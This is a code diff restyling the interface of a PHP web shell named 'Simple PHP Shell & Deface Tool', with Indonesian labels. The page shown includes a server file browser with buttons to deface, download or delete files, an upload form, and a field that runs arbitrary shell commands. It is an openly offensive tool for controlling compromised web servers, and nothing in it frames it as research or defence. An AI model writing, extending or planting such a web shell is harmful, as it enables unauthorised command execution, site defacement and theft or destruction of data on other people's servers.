@@ -125,38 +125,145 @@ if (isset($_GET['download'])) {
 }
 ?>
 <!DOCTYPE html>
-<html lang="id" class="bg-gray-900 text-gray-100">
+<html lang="id" class="bg-black text-orange-400">
 <head>
     <meta charset="UTF-8" />
     <title>Simple PHP Shell & Deface Tool</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'VT323', monospace;
+            background-color: #000;
+            color: #ff8c00;
+            font-size: 18px;
+        }
+
+        h1, h2 {
+            font-weight: normal;
+            color: #ff8c00;
+        }
+
+        a {
+            color: #ff8c00;
+        }
+
+        input[type="text"],
+        input[type="file"] {
+            background: #111;
+            color: #ff8c00;
+            border: 1px solid #ff8c00;
+            padding: 4px 8px;
+            width: 100%;
+        }
+
+        pre {
+            background: #000;
+            color: #00ff00;
+            padding: 10px;
+            border: 1px solid #222;
+            overflow-x: auto;
+            white-space: pre-wrap;
+        }
+
+        button,
+        a.button {
+            background: #ff8c00;
+            color: #000;
+            border: none;
+            padding: 4px 10px;
+            text-decoration: none;
+            cursor: pointer;
+            font-family: 'VT323', monospace;
+            font-size: 18px;
+        }
+
+        button:hover,
+        a.button:hover {
+            background: #ffa733;
+        }
+
+        .panel {
+            background: #111;
+            border: 1px solid #222;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+
+        ul {
+            list-style: none;
+            padding-left: 0;
+        }
+
+        li {
+            margin-bottom: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .msg {
+            text-align: center;
+            padding: 10px;
+            border: 1px solid #ff8c00;
+            margin-bottom: 20px;
+        }
+
+        .text-green {
+            color: #00ff00;
+        }
+
+        .text-red {
+            color: #ff3333;
+        }
+
+        nav a {
+            text-decoration: none;
+        }
+
+        nav a:hover {
+            text-decoration: underline;
+        }
+
+        ::file-selector-button {
+            background: #ff8c00;
+            color: #000;
+            border: none;
+            padding: 4px 8px;
+            cursor: pointer;
+        }
+
+        ::file-selector-button:hover {
+            background: #ffa733;
+        }
+    </style>
 </head>
-<body class="min-h-screen p-6 font-sans bg-gray-900 text-gray-100">
 
-<div class="max-w-6xl mx-auto">
+<body class="p-6">
 
-    <h1 class="text-4xl font-bold mb-6 text-center">Simple PHP Shell & Deface Tool</h1>
+    <h1 class="text-3xl mb-4">Simple PHP Shell & Deface Tool</h1>
 
     <?php if ($message): ?>
-        <div class="mb-6 px-5 py-3 rounded <?php echo $msgColor === 'green' ? 'bg-green-700' : 'bg-red-700'; ?> text-center font-semibold">
+        <div class="msg <?php echo $msgColor === 'green' ? 'text-green' : 'text-red'; ?>">
             <?php echo h($message); ?>
         </div>
     <?php endif; ?>
 
     <!-- Breadcrumb navigation -->
-    <div class="mb-8 p-4 bg-gray-800 rounded shadow">
-        <h2 class="text-xl font-semibold mb-3">Direktori Saat Ini:</h2>
-        <nav class="text-blue-400 flex flex-wrap gap-1 font-mono select-none" aria-label="Breadcrumb">
+    <div class="panel">
+        <h2 class="text-xl mb-2">Direktori Saat Ini:</h2>
+        <nav class="flex flex-wrap gap-1 font-mono select-none" aria-label="Breadcrumb">
             <?php
             $parts = explode(DIRECTORY_SEPARATOR, $_SESSION['cwd']);
             $accum = '';
 
             if (PHP_OS_FAMILY === 'Windows' && preg_match('/^[A-Z]:$/i', $parts[0])) {
                 $accum = array_shift($parts);
-                echo "<a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($accum) . "</a>";
+                echo "<a href='?cd=" . rawurlencode($accum) . "'>" . h($accum) . "</a>";
             } else {
                 if (empty($parts[0])) {
-                    echo "<a href='?cd=" . rawurlencode('/') . "' class='hover:underline'>/</a>";
+                    echo "<a href='?cd=" . rawurlencode('/') . "'>/</a>";
                     array_shift($parts);
                     $accum = '/';
                 }
@@ -165,36 +272,36 @@ if (isset($_GET['download'])) {
             foreach ($parts as $index => $part) {
                 if ($part === '') continue;
                 $accum = rtrim($accum, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $part;
-                echo "<span>/</span><a href='?cd=" . rawurlencode($accum) . "' class='hover:underline'>" . h($part) . "</a>";
+                echo "<span>/</span><a href='?cd=" . rawurlencode($accum) . "'>" . h($part) . "</a>";
             }
             ?>
         </nav>
     </div>
 
     <!-- Folder & File list -->
-    <div class="mb-8 bg-gray-800 rounded shadow p-4 overflow-auto max-h-96">
-        <h2 class="text-xl font-semibold mb-4">Isi Folder:</h2>
-        <ul class="list-disc list-inside space-y-1">
+    <div class="panel overflow-auto max-h-96">
+        <h2 class="text-xl mb-2">Isi Folder:</h2>
+        <ul>
             <?php
             $items = scandir($_SESSION['cwd']);
             foreach ($items as $file) {
                 if ($file === '.' || $file === '..') continue;
                 $fullPath = $_SESSION['cwd'] . DIRECTORY_SEPARATOR . $file;
                 $real = realpath($fullPath);
-                if ($real === false) continue; // skip broken symlinks etc.
+                if ($real === false) continue;
+
                 if (is_dir($real)) {
-                    // link to the directory's realpath (encoded)
-                    echo "<li><a href='?cd=" . rawurlencode($real) . "' class='text-blue-400 font-medium hover:underline cursor-pointer'>[DIR] " . h($file) . "</a></li>";
+                    echo "<li><a href='?cd=" . rawurlencode($real) . "'>[DIR] " . h($file) . "</a></li>";
                 } else {
-                    echo "<li class='flex justify-between items-center gap-3'>
+                    echo "<li>
                             <span>[FILE] " . h($file) . "</span>
                             <div class='flex gap-2'>
-                                <form method='post' class='inline' onsubmit='return confirm(\"Deface file " . h($file) . "?\")'>
+                                <form method='post' onsubmit='return confirm(\"Deface file " . h($file) . "?\")'>
                                     <input type='hidden' name='deface_file' value='" . h($file) . "' />
-                                    <button type='submit' class='bg-red-600 hover:bg-red-700 px-3 py-1 rounded text-white text-sm'>Deface</button>
+                                    <button type='submit'>Deface</button>
                                 </form>
-                                <a href='?download=" . urlencode($file) . "' class='bg-blue-600 hover:bg-blue-700 px-3 py-1 rounded text-white text-sm'>Download</a>
-                                <a href='?delete=" . urlencode($file) . "' class='bg-yellow-500 hover:bg-yellow-600 px-3 py-1 rounded text-white text-sm' onclick='return confirm(\"Hapus file " . h($file) . "?\")'>Delete</a>
+                                <a href='?download=" . urlencode($file) . "' class='button'>Download</a>
+                                <a href='?delete=" . urlencode($file) . "' class='button' onclick='return confirm(\"Hapus file " . h($file) . "?\")'>Delete</a>
                             </div>
                         </li>";
                 }
@@ -204,26 +311,25 @@ if (isset($_GET['download'])) {
     </div>
 
     <!-- Form upload -->
-    <div class="mb-8 bg-gray-800 rounded shadow p-4">
-        <h2 class="text-xl font-semibold mb-4">Upload File:</h2>
+    <div class="panel">
+        <h2 class="text-xl mb-2">Upload File:</h2>
         <form method="post" enctype="multipart/form-data" class="flex gap-4 items-center">
-            <input type="file" name="upload_file" class="bg-gray-700 text-white p-2 rounded">
-            <button type="submit" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-white">Upload</button>
+            <input type="file" name="upload_file">
+            <button type="submit">Upload</button>
         </form>
     </div>
 
     <!-- Form shell -->
-    <div class="bg-gray-800 rounded shadow p-4">
-        <h2 class="text-xl font-semibold mb-4">Eksekusi Perintah Shell:</h2>
+    <div class="panel">
+        <h2 class="text-xl mb-2">Eksekusi Perintah Shell:</h2>
         <form method="get" class="flex gap-4 items-center">
-            <input type="text" name="cmd" class="flex-1 bg-gray-700 text-white p-2 rounded" placeholder="Masukkan perintah shell">
-            <button type="submit" class="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-white">Jalankan</button>
+            <input type="text" name="cmd" placeholder="Masukkan perintah shell">
+            <button type="submit">Jalankan</button>
         </form>
         <?php if (isset($output)): ?>
-        <pre class="mt-4 p-4 bg-black text-green-400 rounded overflow-auto max-h-60"><?php echo h($output); ?></pre>
+        <pre class="mt-4"><?php echo h($output); ?></pre>
         <?php endif; ?>
     </div>
 
-</div>
 </body>
 </html>
